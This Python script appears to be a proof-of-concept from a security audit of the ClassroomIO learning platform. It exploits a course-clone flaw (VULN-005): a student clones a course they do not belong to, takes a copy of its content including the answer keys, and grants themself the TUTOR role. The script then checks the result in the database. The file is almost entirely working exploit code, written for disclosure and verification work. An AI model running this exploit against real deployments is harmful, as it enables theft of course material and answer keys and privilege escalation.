#!/usr/bin/env python3
"""
VULN-005 (F-12) — Course clone: steal any course (incl. answer keys) + self-grant TUTOR.

Vulnerable code (targets/classroomio/):
  * route:   apps/api/src/routes/course/course.ts:593-621 (POST /:courseId/clone, orgMemberMiddleware)
  * service: apps/api/src/services/course/clone.ts:204-301 (cloneCourse)
               - line 213 getCourseById(courseId)          ← NO ownership/membership check on the source
               - line 216-220 createGroup({organizationId}) ← destination org from the request BODY
               - line 244-250 addGroupMember(roleId=TUTOR)  ← caller self-granted TUTOR of the clone
               - cloneExercises() line 185-201 copies options INCLUDING isCorrect (answer keys)
  * schema:  packages/utils/src/validation/course/course.ts:14-19 (ZCourseClone — organizationId unrelated to caller)

Class: CWE-639 IDOR / BOLA (cross-tenant read+theft) + CWE-269 self-role grant.

The flaw: `POST /:courseId/clone` is gated by `orgMemberMiddleware`, which admits ANY
role (incl. STUDENT) and only proves the caller is *some* member of the header org.
`cloneCourse` then loads the SOURCE course by id with no ownership/membership check,
deep-copies its sections/lessons/exercises/questions/options (answer keys, isCorrect
included), writes the copy into the BODY-supplied organizationId, and inserts the
caller as TUTOR of the new group.

Exploitation idea: a STUDENT who has no relationship to a course clones it by id →
receives a full copy of its content + answer keys and becomes TUTOR of the copy.

A successful run proves: a STUDENT who is NOT a member of the source course clones it
and (1) becomes roleId TUTOR of the new group, (2) the new course contains the source
lesson, and (3) the source exercise's correct-answer option (isCorrect=true) was copied
verbatim into a course the student now controls.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (  # noqa: E402
    log, banner, verdict, rid, psql, make_student, admin_login, create_course, ROLE, ORG_ID,
)

VULN = "VULN-005"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN, "Course clone: cross-tenant theft (incl. answer keys) + self-TUTOR")
    log("INFO", "route course.ts:593 orgMemberMiddleware (any role); service clone.ts:213 getCourseById — no ownership check")

    admin = admin_login()

    # ── Victim course X (admin), seeded with a lesson + an exercise whose correct
    #    answer we mark with a UNIQUE label, so finding it under the clone proves theft.
    secret_lesson = f"SECRET-LESSON-{rid('L')}"
    secret_answer = f"CORRECT-ANSWER-{rid('ans')}"
    log("SETUP", "admin creates victim course X with a lesson and a graded exercise (answer key)")
    course_x = create_course(admin, title=f"Victim Course {rid('X')}")
    x_id = course_x["id"]

    rl = admin.post(f"/course/{x_id}/lesson", org=True, org_id=ORG_ID,
                    json={"title": secret_lesson, "courseId": x_id, "order": 1})
    if rl.status_code not in (200, 201):
        log("FAIL", f"lesson create failed: {rl.status_code} {rl.text[:200]}")
        sys.exit(1)
    lesson_x = rl.json()["data"]["id"]

    exercise_body = {
        "title": f"Graded Exam {rid('ex')}", "courseId": x_id, "lessonId": lesson_x, "order": 1,
        "questions": [{
            "question": "What is the secret answer?", "questionTypeId": 1, "points": 1, "order": 0,
            "options": [
                {"label": secret_answer, "isCorrect": True},
                {"label": "wrong-decoy", "isCorrect": False},
            ],
        }],
    }
    re = admin.post(f"/course/{x_id}/exercise", org=True, org_id=ORG_ID, json=exercise_body)
    log("SETUP", f"exercise create HTTP {re.status_code}")
    if re.status_code not in (200, 201):
        log("FAIL", f"exercise create failed: {re.text[:300]}")
        sys.exit(1)
    log("SETUP", f"course X={x_id} lesson={lesson_x} secret_answer label={secret_answer!r} (isCorrect=true)")

    # ── Attacker: a STUDENT with NO relationship to course X (make_student enrolls them
    #    in their own separate course only).
    log("SETUP", "attacker: a STUDENT who is NOT a member of course X")
    student, info = make_student(admin, label="clone-thief")
    sid = info["user_id"]
    x_group = psql(f"select group_id from course where id='{x_id}';")
    is_member = psql(f"select count(*) from groupmember where group_id='{x_group}' and profile_id='{sid}';")
    log("SETUP", f"student user={sid}; is a member of X's group? {is_member} (expect 0)")

    # ── Attack: the STUDENT clones course X into the org.
    slug = f"stolen-{rid('s')}"
    log("STEP", f"POST /course/{x_id}/clone  as STUDENT  {{organizationId: {ORG_ID}}}")
    r = student.post(f"/course/{x_id}/clone", org=True, org_id=ORG_ID,
                     json={"title": f"Stolen {rid('t')}", "slug": slug, "organizationId": ORG_ID})
    log("INFO", f"  response: HTTP {r.status_code} {r.text[:200]}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### {VULN} — clone any course as a STUDENT (no membership of the source)\n")
        f.write("### Cookie: classroomio.session_token=<STUDENT session, not a member of the source course>\n\n")
        f.write(f"POST http://localhost:21527/course/{x_id}/clone HTTP/1.1\n")
        f.write("Host: localhost:21527\n")
        f.write(f"cio-org-id: {ORG_ID}\n")
        f.write("Content-Type: application/json\n\n")
        f.write(f'{{"title":"Stolen","slug":"{slug}","organizationId":"{ORG_ID}"}}\n')

    if r.status_code not in (200, 201):
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(f"POST /course/{x_id}/clone (STUDENT)\nHTTP {r.status_code}\n\n{r.text}\n")
        verdict(VULN, "FAILED", f"clone returned HTTP {r.status_code}")
        log("FAIL", r.text[:300])
        sys.exit(1)

    body = r.json()
    new_course = body.get("course") or {}
    new_id = new_course.get("id")
    log("INFO", f"  cloned into new course id={new_id}")

    # ── Ground-truth side effects on the CLONE.
    new_group = psql(f"select group_id from course where id='{new_id}';")
    tutor_role = psql(f"select role_id from groupmember where group_id='{new_group}' and profile_id='{sid}';")
    stolen_lesson = psql(f"select count(*) from lesson where course_id='{new_id}' and title='{secret_lesson}';")
    stolen_answer = psql(
        "select o.is_correct from option o "
        "join question q on o.question_id=q.id "
        "join exercise e on q.exercise_id=e.id "
        "join lesson l on e.lesson_id=l.id "
        f"where l.course_id='{new_id}' and o.label='{secret_answer}';")

    log("PROOF", f"attacker groupmember.role_id in the CLONE's group = {tutor_role!r} (expected '{ROLE['TUTOR']}' = TUTOR)")
    log("PROOF", f"clone contains source lesson {secret_lesson!r}? count={stolen_lesson!r} (expected '1')")
    log("PROOF", f"clone contains the source's correct-answer option {secret_answer!r} with is_correct={stolen_answer!r} (expected 't')")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"POST /course/{x_id}/clone (STUDENT session)\nHTTP {r.status_code}\n\n{r.text}\n")
        f.write("\n-- DB side effects on the CLONE --\n")
        f.write(f"new course id = {new_id}  group = {new_group}\n")
        f.write(f"attacker role_id in clone group = {tutor_role} (2=TUTOR)\n")
        f.write(f"cloned source lesson '{secret_lesson}' count = {stolen_lesson}\n")
        f.write(f"cloned correct-answer option '{secret_answer}' is_correct = {stolen_answer}\n")

    became_tutor = tutor_role == str(ROLE["TUTOR"])
    got_content = stolen_lesson == "1"
    got_answer_key = stolen_answer == "t"

    if became_tutor and got_content and got_answer_key:
        verdict(VULN, "CONFIRMED",
                "STUDENT cloned a course they don't belong to → TUTOR of the copy + content + answer keys stolen")
        log("OK", "exploit confirmed — cross-course theft of content and graded answer keys, plus self-TUTOR")
        sys.exit(0)

    verdict(VULN, "FAILED",
            f"tutor={became_tutor} content={got_content} answer_key={got_answer_key}")
    log("FAIL", "clone did not fully reproduce the theft/self-TUTOR")
    sys.exit(1)


if __name__ == "__main__":
    main()
